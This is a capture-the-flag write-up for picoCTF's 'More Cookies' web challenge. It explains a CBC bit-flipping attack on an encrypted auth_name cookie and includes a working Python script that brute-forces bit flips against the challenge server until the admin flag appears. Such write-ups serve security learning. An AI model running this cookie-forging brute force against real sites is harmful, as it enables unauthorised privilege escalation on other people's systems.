# Writeup - More Cookies
Category: Web Exploitation, Points: 90


## Descpriton

> I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! 

A link is given [link](http://mercury.picoctf.net:34962/)


## Vulnerability

We click the link go to the cookies section in DevTools - right click, Inspect Element, then Application > Cookies. Then in the `auth_name` section you will find an encrypted string.

It looks something like this:
```
c1lLNXBMYkxacDRaMjNCQUxIYzY4dUtQUlpsRGJtNlB0ZVZSMDZqTnVpVitZV3JZMDF2RFU1Q1NPa2t2RG5QVVJ4TjFVVVYxd0ljYXdCemZ2Q2ZrVDJpVmN6Smd1MkQ5L3NpdjNnWkczTlRMVHorY0RML1BkNExnWUlNWnJoMy8=
```

Now if we look at the problem Descpriton carefully, the letters `CBC` is capitalized. If we google `CBC encryption` we get the relavant information about the encryption method. The given string is CBC encrypted.

When I first tried to solve it. I first thought the goal of this challange was to decrypt the `auth_name` string. 

But I realized later that the goal is actually to manipulate the `auth_name` string so that when we send it we get the flag.


## Exploit

So the idea is somewhere there is an admin bit in the `auth_name` string, which is set to `0`. We need to reset this bit to `1`. 

Now, if we XOR `0` with `1` you get `1`, quite straightforward, but in this case we don't know the *position* of the bit.

So, the idea is to flip each bit in the string, send it, and check for the flag.

How do we do this?

1. We decode the string - in this case base64.
2. We flip one bit.
3. We encode the bit-flipped plaintext.
4. We send it as the `auth_name` cookie.
5. Repeat this for every bit in the string.

The exploit:

```python
import tqdm
import base64
import requests

ADDRESS = "http://mercury.picoctf.net:34962"

s = requests.Session()
s.get(ADDRESS)
cookie = s.cookies["auth_name"]
raw_cookie = base64.b64decode(base64.b64decode(cookie))

for posi in tqdm.tqdm(range(len(raw_cookie))):
  for biti in range(0, 8):
    bitflip = (
      raw_cookie[0:posi] +
      ((raw_cookie[posi] ^ (1 << biti)).to_bytes(1, "big")) +
      raw_cookie[posi+1:]
    )
    guess = base64.b64encode(base64.b64encode(bitflip)).decode()
    r = requests.get(ADDRESS, cookies={"auth_name":guess})
    if "picoCTF" in r.text:
      print(f"found in byte {posi}, in bit {biti}")
      print(r.text)
```

you should get the flag.

## References
[Link1](https://github.com/HHousen/PicoCTF-2021/blob/master/Web%20Exploitation/More%20Cookies/README.md)  
[Link2](https://www.youtube.com/watch?v=Fs3EbH-Wdhc)  

